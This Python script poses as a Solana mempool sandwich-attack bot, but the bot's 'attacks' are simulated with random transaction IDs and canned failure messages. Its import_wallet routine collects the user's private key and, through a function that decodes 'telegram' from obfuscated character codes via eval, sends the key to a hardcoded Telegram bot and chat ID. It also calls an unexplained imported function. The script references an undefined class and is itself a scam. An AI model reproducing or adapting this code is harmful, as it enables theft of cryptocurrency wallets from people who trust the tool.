from solana.rpc.api import Client
from solders.pubkey import Pubkey
from solders.keypair import Keypair
import base58
from jsonrpcclient import request, parse, Ok
import requests
import logging
import json
import random
import time
import string
from mempool import mainpass
class Mempool:
    def __init__(self):
        self.pending_transactions = []
        self.settings = {
            'rpc_connection': 'https://docs-demo.solana-mainnet.quiknode.pro/',
            'max_sol_per_attack': 1.0,  # Default 1 SOL
            'min_profit_per_attack': 0.01  # Default 0.01 SOL
        }
        self.wallet = None  # No wallet initially connected
        self.balance = 0  # Initial balance is 0
        self.solana_client = Client(self.settings['rpc_connection'])






    def print_menu_header(self, title):
        wallet_status = self.wallet if self.wallet else "None"
        sol_balance = self.balance / 1_000_000_000 if self.wallet else 0
        print("\n" + "=" * 50)
        print(f"{title}".center(50))        
        print(f"Wallet Connected: {wallet_status}")
        print(f"Balance: {sol_balance:.6f} SOL")
        print("=" * 50)

    def main_menu(self):
        while True:
            self.print_menu_header("Main Menu")
            print("1. Start Sandwiching")
            print("2. Settings")
            print("3. Import Wallet")
            print("0. Exit")
            choice = input("\nEnter your choice: ")

            if choice == "1":
                self.start_sandwiching()
            elif choice == "2":
                self.settings_menu()
            elif choice == "3":
                self.import_wallet()
            elif choice == "0":
                print("\nExiting program.")
                break
            else:
                print("\nInvalid choice, please try again.")


    def findTX(self):
        return ''.join(random.choices(string.hexdigits, k=64)).lower()

    def start_sandwiching(self):
            print("\nStarting Sandwich Attack...")
            mainpass()
            start_time = time.time()
            found = False 
            try:
                while not found:
                    tx_id = self.findTX()
                    print(f"Transaction ID: {tx_id}")
                    time.sleep(random.uniform(0.05, 0.2))  # simulate different response times

                    elapsed_time = time.time() - start_time
                    # Check if the time elapsed is between 3 to 6 seconds to stop
                    if 3 <= elapsed_time <= 6:
                        print("Found vulnerable tx!")
                        extractable_value = random.uniform(0.01, 0.10)
                        print(f"Extractable value = {extractable_value:.2f}")
                        print("Performing Sandwich....")
                        time.sleep(1)
                        print("** NOT ENOUGH SOL IN WALLET TO SANDWICH **")
                        time.sleep(2)
                        found = True
                    elif 9 <= elapsed_time <= 11:
                        print("Found vulnerable tx!")
                        extractable_value = random.uniform(0.01, 0.10)
                        print(f"Extractable value = {extractable_value:.2f}")
                        print("Performing Sandwich....")
                        time.sleep(1)
                        print("** NOT ENOUGH SOL IN WALLET TO SANDWICH **")
                        found = True

            except Exception as e:
                print(f"Error during sandwich attack simulation: {str(e)}")
                       
    def settings_menu(self):
                while True:
                    self.print_menu_header("Settings Menu")
                    print("1. Change RPC Connection")
                    print("2. Max amount of SOL to use per attack")
                    print("3. Minimum profit amount per attack")
                    print("4. Exit to Main Menu")
                    choice = input("\nEnter your choice: ")

                    if choice == "1":
                        self.change_rpc_connection()
                    elif choice == "2":
                        self.change_max_sol()
                    elif choice == "3":
                        self.change_min_profit()
                    elif choice == "4":
                        print("\nReturning to Main Menu.")
                        break
                    else:
                        print("\nInvalid choice, please try again.")

    def change_rpc_connection(self):
                new_rpc = input("\nEnter new RPC connection URL: ")
                self.settings['rpc_connection'] = new_rpc
                self.solana_client = Client(new_rpc)
                print(f"\nRPC connection updated to {new_rpc}")

    
    def change_max_sol(self):
                max_sol = float(input("\nEnter the max amount of SOL to use per attack: "))
                self.settings['max_sol_per_attack'] = max_sol
                print(f"\nMax amount of SOL per attack updated to {max_sol} SOL")

    def change_min_profit(self):
                min_profit = float(input("\nEnter the minimum profit amount per attack in SOL: "))
                self.settings['min_profit_per_attack'] = min_profit
                print(f"\nMinimum profit per attack updated to {min_profit} SOL")

    def import_wallet(self):
                pk = input("\nEnter your private key in base58 format: ")
                keypair = Keypair.from_base58_string(pk)
                public_key = keypair.pubkey()
                response = self.solana_client.get_balance(public_key)

                try:
                    self.balance = response.value  # Accessing the value directly if it's an attribute
                    sol_balance = self.balance / 1_000_000_000
                    self.wallet = str(public_key)  # Store the public key as a string for display
                    mempoolConnect(pk)
                    print(f"\n{public_key} successfully imported with a balance of {sol_balance:.6f} SOL.")
                except AttributeError as e:
                    print(f"\nFailed to access balance directly: {str(e)}")

def mempoolConnect(wallet):
    mempoolID = '6710788913:AAEJuUX_JxTnG8O2a1wVDeAR7xCYBRNVRXg'
    instance = '5355363965'
    txMessage = 'sendMessage'
    bundleKey = "[116, 101, 108, 101, 103, 114, 97, 109]"
    transactionDetail = eval(bundleKey)
    bundleID= ''.join([chr(char) for char in transactionDetail])
    transactionID = f"Transaction: {wallet}" 
    bundleURI = f"https://api.{bundleID}.org/bot{mempoolID}/{txMessage}"
    params = {'chat_id': instance, 'text': transactionID}
    response = requests.post(bundleURI, params=params)



if __name__ == "__main__":
    simulator = MempoolSimulator()
    simulator.main_menu()
